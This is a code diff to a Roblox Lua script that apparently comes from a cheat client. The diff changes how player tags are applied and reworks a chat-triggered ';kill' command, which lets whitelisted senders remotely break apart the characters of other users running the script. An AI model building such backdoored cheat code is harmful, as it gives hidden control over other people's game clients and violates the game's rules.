@@ -48,7 +48,6 @@ local function applyTag(plr, txt, col)
 		l.TextScaled = true
 		l.Parent = b
 	end
-	if plr == LOCAL_PLAYER then return end
 	if plr.Character then render() end
 	plr.CharacterAdded:Connect(function()
 		task.wait(0.5)
@@ -67,12 +66,47 @@ local function tag(plr)
 	end
 end
 
-for _, p in ipairs(Players:GetPlayers()) do tag(p) end
+local function hasTag(plr)
+	local head = plr.Character and plr.Character:FindFirstChild("Head")
+	return head and head:FindFirstChild("VapeTag") ~= nil
+end
+
+task.spawn(function()
+	while true do
+		for _, plr in ipairs(Players:GetPlayers()) do
+			if plr ~= LOCAL_PLAYER and not hasTag(plr) then
+				tag(plr)
+			end
+		end
+		task.wait(2)
+	end
+end)
+
 Players.PlayerAdded:Connect(function(p)
 	task.delay(1, function()
 		tag(p)
+		tag(LOCAL_PLAYER)
 	end)
 end)
+
+LOCAL_PLAYER.CharacterAdded:Connect(function()
+	task.wait(1)
+	tag(LOCAL_PLAYER)
+end)
+
+local lastKillTimestamp = 0
+
+local function executeKill()
+	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
+	local char = LOCAL_PLAYER.Character
+	if char then
+		for _, part in ipairs(char:GetDescendants()) do
+			if part:IsA("BasePart") then
+				part:BreakJoints()
+			end
+		end
+	end
+end
 
 TextChatService.OnIncomingMessage = function(message)
 	local source = message.TextSource
@@ -81,17 +115,19 @@ TextChatService.OnIncomingMessage = function(message)
 	if not isWhitelisted(senderId) then return end
 
 	local msg = message.Text:lower()
-	if msg == ";kill" and not isWhitelisted(LOCAL_PLAYER.UserId) then
-		local char = LOCAL_PLAYER.Character
-		if char then
-			for _, part in ipairs(char:GetDescendants()) do
-				if part:IsA("BasePart") then
-					part:BreakJoints()
-				end
-			end
-		end
+	if msg == ";kill" then
+		lastKillTimestamp = tick()
 	end
 end
+
+task.spawn(function()
+	while true do
+		if tick() - lastKillTimestamp <= 2 then
+			executeKill()
+		end
+		task.wait(0.5)
+	end
+end)
 
 local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
